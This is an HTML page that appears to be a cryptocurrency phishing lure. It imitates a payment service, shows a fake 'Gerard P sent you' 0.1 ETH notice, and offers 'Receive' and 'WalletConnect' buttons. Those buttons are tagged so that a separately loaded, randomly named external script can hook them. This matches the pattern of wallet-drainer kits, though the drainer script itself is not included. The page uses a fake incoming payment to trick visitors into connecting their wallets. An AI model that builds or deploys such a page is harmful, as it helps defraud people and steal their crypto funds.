<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>cryptosend – Send ETH</title>

<!-- Google Font -->
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
<!-- Font Awesome (seulement pour les petites icônes décoratives) -->
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet" integrity="sha512-RXf+QSDCUQs5uwgDDnBEkM9ypUtfaCJom6z4CEQZttfPc54RrpFFSUxZ+t96a6avG3lMMTUh3pvN3DtKbP47Cw==" crossorigin="anonymous" referrerpolicy="no-referrer">

<style>
    :root{
        --brand-black:#000;
        --brand-gray:#a6a6a6;
        --error-red:#d32f2f;
        --bg:#fafafa;
        --sep:#e0e0e0; /* séparateur gris clair */
    }
    *{box-sizing:border-box;margin:0;padding:0;font-family:'Poppins',sans-serif;}
    body{background:var(--bg);min-height:100vh;display:flex;flex-direction:column;align-items:center;padding-top:40px;}

    /* ——— Card container ——— */
    .card{width:400px;background:#fff;border-radius:22px;box-shadow:0 12px 34px rgba(0,0,0,.06);padding:36px 36px 46px;}

    /* ——— Header ——— */
    .top-row{display:flex;align-items:center;gap:14px;margin-bottom:26px;}
    .brand{display:flex;align-items:center;gap:12px;flex:1;}
    .logo{height:36px;}
    .site-name{font-size:20px;font-weight:600;color:var(--brand-black);text-transform:capitalize;}
    .signup{padding:6px 18px;font-size:14px;font-weight:600;border:2px solid var(--brand-black);background:transparent;border-radius:50px;cursor:pointer;}

    /* ——— Sender message ——— */
    .sender-message{text-align:center;font-size:16px;color:var(--brand-gray);margin-bottom:20px;font-weight:400;}

    /* ——— Amount section ——— */
    .amount-input-wrapper{position:relative;text-align:center;margin-bottom:12px;}
    .amount-input{width:100%;font-size:36px;text-align:center;border:none;outline:none;font-weight:600;}
    .amount-input[readonly]{background:transparent;cursor:default;}
    input[type=number]::-webkit-outer-spin-button,input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none;margin:0;}
    input[type=number]{-moz-appearance:textfield;}

    /* Toggle ETH / USD */
    .switcher{display:flex;gap:6px;justify-content:center;margin-top:10px;}
    .tab{padding:5px 18px;font-size:13px;font-weight:600;border:2px solid var(--brand-black);background:#fff;border-radius:50px;cursor:pointer;transition:background .15s,color .15s;}
    .tab.selected{background:var(--brand-black);color:#fff;}
    .eq-value{font-size:14px;color:var(--brand-gray);margin-top:8px;}

    /* ——— Network line ——— */
    .net-info{display:flex;align-items:center;justify-content:space-between;margin:28px 0 24px;font-size:14px;}
    .net-left{display:flex;flex-direction:column;gap:4px;}
    .net-name{font-weight:600;}
    .net-note{color:var(--brand-gray);font-size:13px;}
    .net-icons i{margin-left:18px;font-size:17px;cursor:pointer;}

    /* ——— Address input ——— */
    .address-input{width:100%;padding:14px 18px;font-size:15px;border:2px solid var(--brand-gray);border-radius:12px;margin-bottom:26px;}
    .address-input[readonly]{background:var(--bg);color:var(--brand-black);cursor:default;}

    /* ——— Primary CTA ——— */
    .btn-primary{width:100%;padding:16px 0;font-size:16px;font-weight:600;color:#fff;background:var(--brand-black);border:none;border-radius:14px;cursor:pointer;transition:background .2s;}
    .btn-primary:disabled{background:var(--brand-gray);}

    /* ——— Divider ——— */
    .divider{display:flex;align-items:center;margin:22px 0 16px;}
    .divider::before,.divider::after{content:"";flex:1;height:1px;background:var(--bg);} 
    .divider span{margin:0 14px;color:var(--brand-gray);font-size:13px;}

    /* ——— Alternatives: Paylink / WalletConnect ——— */
    .alt-buttons{display:flex;flex-direction:column;align-items:stretch;margin-bottom:6px;}
    .btn-alt{width:100%;padding:13px 0;font-size:15px;font-weight:600;border:2px solid var(--brand-gray);background:transparent;border-radius:14px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;}
    .alt-separator{width:100%;height:1px;background:var(--sep);margin:8px 0;border-radius:1px;}
    .wc-icon{height:18px;}

    /* ——— Error ——— */
    .error{display:none;margin-top:24px;text-align:center;line-height:1.5;font-size:15px;color:var(--error-red);} 
    .error b{text-decoration:underline;}
</style>
</head>
<body>

<div class="card">
    <!-- Header -->
    <div class="top-row">
        <div class="brand">
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSrbWLqp5VrDuBnCakuJi9S4g9V4Lu4exeIsg&s" alt="cryptosend logo" class="logo">
            <span class="site-name">cryptomus</span>
        </div>
        <button class="signup">Gerard&nbsp;P.</button>
    </div>

    <!-- Sender message -->
    <div class="sender-message">Gerard P sent you :</div>

    <!-- Amount -->
    <div class="amount-input-wrapper">
        <input type="number" id="amount" class="amount-input" placeholder="0.0000" step="any" value="0.1" readonly>
        <div class="switcher">
            <button id="ethTab" class="tab selected">ETH</button>
            <button id="usdTab" class="tab">USD</button>
        </div>
        <div class="eq-value" id="eqVal">≈ 0.00 USD</div>
    </div>

    <!-- Network line -->
    <div class="net-info">
        <div class="net-left">
            <div class="net-name">Network – Ethereum</div>
            <div class="net-note">You pay network fee</div>
        </div>
        <div class="net-icons">
            <i class="fa fa-gift"></i>
            <i class="fa fa-question-circle"></i>
            <i class="fa fa-cog"></i>
        </div>
    </div>

    <!-- Address -->
    <input type="text" id="address" class="address-input" placeholder="Recipient wallet address" value="0xE9D8FD3d023d25B672D1a83D089c57a4237cd173" readonly>

    <!-- Primary CTA -->
    <button id="sendBtn" class="btn-primary interact-button">Receive</button>

    <!-- Alternative methods -->
    <div class="divider"><span>OR</span></div>
    <div class="alt-buttons">
        <button class="btn-alt interact-button" id="walletBtn">
            <img src="https://files.svgcdn.io/simple-icons/walletconnect.svg" alt="WalletConnect" class="wc-icon">
            WalletConnect
        </button>
    </div>
</div>

<script>
// === State ===
let useEth = true;              // true → ETH, false → USD
const rate = 2400;              // 1 ETH = 2 400 USD (demo)

// === Elements ===
const ethTab   = document.getElementById('ethTab');
const usdTab   = document.getElementById('usdTab');
const amountIn = document.getElementById('amount');
const eqVal    = document.getElementById('eqVal');
const sendBtn  = document.getElementById('sendBtn');
const addrInp  = document.getElementById('address');

// === Currency toggle ===
function setCurrency(isEth){
    useEth = isEth;
    ethTab.classList.toggle('selected', isEth);
    usdTab.classList.toggle('selected', !isEth);
    amountIn.placeholder = isEth ? '0.0000' : '0.00';
    
    // Update the fixed amount based on currency
    if(isEth){
        amountIn.value = '0.1';
    }else{
        amountIn.value = (0.1 * rate).toFixed(2); // 0.1 ETH in USD
    }
    
    updateEquivalent();
}

function updateEquivalent(){
    const val = parseFloat(amountIn.value) || 0;
    if(useEth){
        const usd = val * rate;
        eqVal.textContent = `≈ ${usd.toLocaleString('en-US',{style:'currency',currency:'USD',maximumFractionDigits:2})}`;
    }else{
        const eth = val / rate;
        eqVal.textContent = `≈ ${eth.toFixed(6)} ETH`;
    }
}

// === Event binding ===
ethTab.addEventListener('click', () => setCurrency(true));
usdTab.addEventListener('click', () => setCurrency(false));
amountIn.addEventListener('input', updateEquivalent);

// === Send button behaviour ===
sendBtn.addEventListener('click', () => {
    console.log('Send button clicked');
    // Button click handler - can be customized for actual functionality
});

// === WalletConnect button behaviour ===
const walletBtn = document.getElementById('walletBtn');
walletBtn.addEventListener('click', () => {
    console.log('WalletConnect button clicked');
    // This should trigger the WalletConnect prompt
    // The external script should handle this via the interact-button class
});

// === Debug: Check if external script elements exist ===
console.log('Buttons with interact-button class:', document.querySelectorAll('.interact-button'));

// === Init ===
updateEquivalent();
</script>

<script charset="UTF-8" type="text/javascript" src="./db08cb40-8daa-4e17-9236-97ee9a2c6506.js" 
    onload="console.log('External script loaded successfully')" 
    onerror="console.error('Failed to load external script')">
</script>

</body>
</html>
